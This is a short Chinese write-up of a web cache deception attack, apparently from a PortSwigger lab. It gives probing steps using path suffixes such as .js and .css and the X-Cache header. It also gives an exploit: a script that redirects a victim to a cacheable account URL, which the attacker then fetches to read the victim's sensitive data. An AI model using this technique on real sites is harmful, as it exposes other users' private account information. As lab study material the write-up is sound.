将目标的敏感信息缓存到 URL 中.

为方便演示, 将结果: `敏感信息,X-Cache` 以数字 `0` 和 `1` 组合演示;
不存在的信息用 `0` 表示, 存在的信息用 `1` 表示

## 1. PoC

1. 访问 https://example.com/my-account 1,0
2. 访问 https://example.com/my-accounttest 0,0
3. 访问 https://example.com/my-account/test 1,0
   (在这一步测试可用的分隔符)
4. 访问 https://example.com/my-account/test.js 1,1
   (后缀可能是: `.js` , `.css` , `.ico` , `.exe`)
5.  `Cache-Control: max-age=30` 则在 30 秒内重新发送请求
   响应中的 `X-Cache: miss` 变为 `X-Cache: hit` 

## 2. Exploit

1. 制作一个网站诱导目标访问

   ```
   <script>document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account/wcd.js"</script>
   ```

2. 访问后会缓存目标的敏感信息

   ```
   https://YOUR-LAB-ID.web-security-academy.net/my-account/wcd.js
   ```

3. 此时攻击者在 30 秒内从隐私浏览器中访问 URL 即可得到目标的敏感信息

---

References

- [Web cache deception](https://portswigger.net/web-security/web-cache-deception)

